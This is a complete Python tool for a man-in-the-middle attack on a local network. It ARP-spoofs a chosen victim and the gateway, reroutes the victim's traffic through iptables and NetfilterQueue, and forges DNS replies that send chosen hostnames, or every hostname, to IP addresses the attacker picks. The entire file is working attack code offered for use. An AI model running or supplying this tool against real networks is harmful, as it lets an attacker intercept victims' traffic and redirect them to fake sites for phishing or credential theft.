import socket
import os
import scapy.all as scapy
import argparse
import errno
import sys
import ipaddress
from netfilterqueue import NetfilterQueue
import multiprocessing as mp
import json

def get_mac(ip_addr, interface):
    eth_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_packet = scapy.ARP(pdst = ip_addr)
    ans, unans = scapy.srp(eth_packet / arp_packet, timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def arp_attack(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    print(f"> Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}, Gateway MAC: {gateway_mac}", flush=True)
    print("> Beginning ARP Spoof attack", flush=True)

    p = mp.current_process()

    while getattr(p, 'is_running', True):
        scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = target_mac), iface=interface)
        scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = gateway_mac), iface=interface)

def arp_cleanup(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    print("> Cleaning up ARP spoofing", flush=True)
    
    print("> Re-ARPping target and gateway", flush=True)
    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), iface = interface, count = 7)
    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), iface = interface, count = 7)

    print("> Disabling IP forwarding", flush=True)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print('> ARP spoofing cleanup finished', flush=True)

def get_network_adapter():
    adapters = socket.if_nameindex()

    print("> Select the network adapter to use (by name or number)")

    adapters_map = {}

    for adapter_number, adapter_name in adapters:
        print(f"{adapter_number}: {adapter_name}")
        adapters_map[adapter_number] = adapter_name

    while True:
        selected_adapter = input("> ")

        if len(selected_adapter) == 0:
            continue

        if len(selected_adapter) < 2 and selected_adapter[0].isnumeric():
            # assume length less than 2 is int
            try:
                selected_adapter_num = int(selected_adapter)
                return adapters_map[selected_adapter_num]
            except:
                print("> Unable to determine selected adapter as integer. Try full name")
                continue

        for v in adapters_map.values():
            if v == selected_adapter:
                return v
            
        print("> Unable to determine adapter. Try again")

class PacketHandler():
    def __init__(self, interface, target_ip, spoof_map = None) -> None:
        self.interface = interface
        self.target_ip = target_ip
        self.self_ip = scapy.get_if_addr(interface)
        self.spoof_map = spoof_map or {} # mapping of fake DNS urls to IP addresses
        self.spoof_all = isinstance(self.spoof_map, str)

    def handle_udp(self, packet):
        if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.DNSQR):
            self.handle_dns(packet)  

    def make_dns(self, packet, spoof_ip = None):      
        ip = scapy.IP(
            src = packet[scapy.IP].dst,
            dst = packet[scapy.IP].src
        )

        udp = scapy.UDP(
            dport = packet[scapy.UDP].sport,
            sport = packet[scapy.UDP].dport
        )

        dns = scapy.DNS(
            id = packet[scapy.DNS].id,
            qd = packet[scapy.DNS].qd,
            aa = 1,
            rd = 0,
            qr = 1,
            qdcount = 1,
            ancount = 1,
            nscount = 0,
            arcount = 0,
            ar = scapy.DNSRR(
                rrname = packet[scapy.DNS].qd.qname,
                type = 'A',
                ttl = 600,
                rdata = spoof_ip
            )
        )

        return ip / udp / dns
    
    def get_dns_entry(self, hostname):
        return socket.gethostbyname(hostname)
    
    def handle_dns(self, packet):
        qname = packet[scapy.DNSQR].qname

        if self.spoof_all:
            scapy.send(self.make_dns(packet, self.spoof_map), iface=self.interface)
            print(f'> Intercepted DNS request. Modified host IP to {self.spoof_map}')
            return

        if len(self.spoof_map) == 0:
            ip = self.get_dns_entry(qname)
            scapy.send(self.make_dns(packet, ip), iface=self.interface)
            print('> Intercepted DNS request. Did not modify host IP')
            return

        if qname not in self.spoof_map:
            ip = self.get_dns_entry(qname)
            print('> Intercepted DNS request. Did not modify host IP')
        else:
            ip = self.spoof_map[qname]
            print(f'> Intercepted DNS request. Modified host IP to {ip}')
        
        scapy.send(self.make_dns(packet, ip), iface=self.interface)

    def handle_packet(self, pkt):
        packet = scapy.IP(pkt.get_payload())

        if packet.haslayer(scapy.UDP):
            self.handle_udp(packet)
            return
        
        pkt.accept()
       

def mitm_proxy(interface, target_ip, spoof_map):
    nfqueue = NetfilterQueue()
    packet_handler = PacketHandler(interface, target_ip, spoof_map)
    nfqueue.bind(1, packet_handler.handle_packet)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('')
    nfqueue.unbind()
                
def init_ip_tables(target_ip, nf_queue):
    print("> Enabling IP Forwarding...", flush=True)
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    except IOError as e:
        if e[0] == errno.EPERM:
            print("Program requires root permissions (or sudo) to do ARP spoof attack", flush=True)
            return

    # remove all ip table rules
    os.system('iptables -F')

    # Intercept TCP traffic from victim IP
    os.system(f'iptables -I FORWARD -s {target_ip} -j NFQUEUE --queue-num {nf_queue}')
    os.system(f'iptables -I FORWARD -d {target_ip} -j NFQUEUE --queue-num {nf_queue}')

    print("> IPTables rules initialized")

def destroy_ip_tables():
    os.system('iptables -F')

    print("> IPTables rules destroyed")

def load_spoof_ips(spoof_ips):
    spoof_map = {}

    if len(spoof_ips) == 1:
        try:
            socket.inet_aton(spoof_ips[0])
            return spoof_ips[0]
        except:
            with open(spoof_ips[0], 'r') as f:
                for k, v in json.load(f).items():
                    if k[-1] != '.':
                        k += '.'
                    spoof_map[k.encode('ascii')] = v
    else:
        if len(spoof_ips) % 2 == 1:
            print("> Mapping of host names and IP addresses is not valid. Ensure each host name has an IP address")
            sys.exit(1)
        for i in range(0, len(spoof_ips), 2):
            if spoof_ips[i][-1] != '.':
                spoof_ips[i] += '.'
            spoof_map[spoof_ips[i].encode('ascii')] = spoof_ips[i + 1]
    return spoof_map

def prompt_spoof_ips():
    spoof_map = {}

    print("> Input hostname and corresponding spoof IP")
    print("> Enter 'd' or 'done' to stop making new entries, or leave hostname and IP empty")
    print("> To bind IP to all hosts, leave hostname empty")

    while True:
        hostname = input('> hostname: ')
        ip = input("> ip: ")

        if hostname.lower() in {'d', 'done'} or ip.lower() in {'d', 'done'}:
            return spoof_map
        
        if not hostname and not ip:
            return spoof_map
        
        if not hostname and ip:
            return ip

        if not ip:
            print("> Failed to parse IP address. Try again")
            continue

        if hostname[-1] != '.':
            hostname = hostname + '.'
        
        spoof_map[hostname.encode('ascii')] = ip

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='target IP address, in human-readable form, dot separated', type=str)
    parser.add_argument('-g', '--gateway', help='network gateway IP address, in human-readable form, dot separated', type=str)
    parser.add_argument('-i', '--interface', help='interface to use. If not provided, will be prompted for', type=str)
    parser.add_argument('-q', '--nf-queue', help='queue to use for NFqueue redirection', type=int, default=1)
    parser.add_argument('-s', '--spoof-ip', help=""" 
        Either a single IP to spoof for all DNS requests (i.e 1.2.3.4),
        a mapping of host names to IPs, passed as a list (i.e google.com 1.2.3.4 microsoft.com 5.6.7.8),
        or a path to JSON file formatted as key-value pairs, such as {'google.com': '1.2.3.4', ...}
    """, nargs='+')

    args = parser.parse_args()

    if args.target is None:
        print("> Target IP argument required -t/--target. See <prog_name> --help for more info.")
        sys.exit(1)
    if args.gateway is None:
        print("> Gateway IP argument required -g/--gateway. See <prog_name> --help for more info.")
        sys.exit(1)

    if args.spoof_ip is None:
        spoof_map = prompt_spoof_ips()
    else:
        spoof_map = load_spoof_ips(args.spoof_ip)

    if isinstance(spoof_map, str):
        print(f"> Spoofing all DNS responses with {spoof_map}")
    else:
        print(f"> Spoofing {len(spoof_map)} DNS entries")

    try:
        ipaddress.ip_address(args.target)
    except:
        print("> Target IP is not a valid IP Address")
    try:
        ipaddress.ip_address(args.gateway)
    except:
        print("> Gateway IP address is not a valid IP")

    scapy.conf.verb = False

    interface = args.interface or get_network_adapter()
    init_ip_tables(args.target, args.nf_queue)

    print("> Getting MAC address of gateway and victim")
    target_mac = get_mac(args.target, interface)
    gateway_mac = get_mac(args.gateway, interface)

    arp_process = mp.Process(target=arp_attack, args = (args.target, args.gateway, target_mac, gateway_mac, interface), daemon=True)
    mitm_process = mp.Process(target=mitm_proxy, args = (interface, args.target, spoof_map), daemon=True)
    
    try:
        arp_process.start()
        mitm_process.start()

        print("> Enter ctrl+c to quit. Wait for cleanup to ensure ARP attack is disabled properly")
        while True:
            ...

    except KeyboardInterrupt:
        print("> Received ctrl+c, exiting")
        arp_process.is_running = False
        mitm_process.is_running = False
        arp_process.join()
        mitm_process.join()

    arp_cleanup(args.target, args.gateway, target_mac, gateway_mac, interface)
    destroy_ip_tables()